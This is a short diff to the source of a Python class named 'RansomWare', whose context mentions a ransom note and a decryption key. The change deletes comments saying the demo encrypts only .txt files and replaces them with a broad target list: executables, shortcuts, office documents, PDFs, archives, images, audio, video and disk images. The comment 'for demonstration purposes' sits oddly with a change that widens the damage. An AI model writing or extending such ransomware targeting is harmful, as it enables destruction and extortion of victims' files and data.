@@ -19,14 +19,43 @@ import threading # used for ransom note and decryption key on dekstop
 
 class RansomWare:
 
-    
-    # File exstensions to seek out and Encrypt
+    # File extensions to seek out and Encrypt
     file_exts = [
         'txt',
-       # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
-       # -and leaves other files un-ecnrypted etc.
-       # 'png', 
-
+        'exe',
+        'lnk',
+        'png',  # Uncommented for demonstration purposes
+        'jpg',
+        'jpeg',
+        'gif',
+        'bmp',
+        'tiff',
+        'doc',
+        'docx',
+        'xls',
+        'xlsx',
+        'ods',
+        'pdf',
+        'csv',
+        'zip',
+        'tar',
+        'rar',
+        '7z',
+        'mp4',
+        'avi',
+        'mkv',
+        'mov',
+        'wmv',
+        'mp3',
+        'wav',
+        'flac',
+        'ppt',
+        'pptx',
+        'html',
+        'xml',
+        'json',
+        'bin',
+        'iso'
     ]
 
 
